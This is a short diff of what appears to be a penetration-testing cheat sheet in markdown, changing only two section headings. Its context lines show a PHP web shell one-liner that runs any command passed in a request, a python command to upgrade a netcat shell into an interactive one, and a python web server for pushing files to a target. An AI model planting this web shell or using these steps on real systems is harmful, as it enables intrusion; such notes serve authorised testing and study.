@@ -25,7 +25,7 @@ Payloads:
 <?php system($_REQUEST["cmd"]); ?>
 ```
 
-## Getting interactive shell:
+## Getting interactive shell
 - In netcat
 ```
 python -c 'import pty; pty.spawn("/bin/bash")'
@@ -37,7 +37,7 @@ fg
 ```
 > press `Enter`
 
-## Uploading files
+## Uploading files to target
 - On your machine
 ```
 python -m http.server 8000
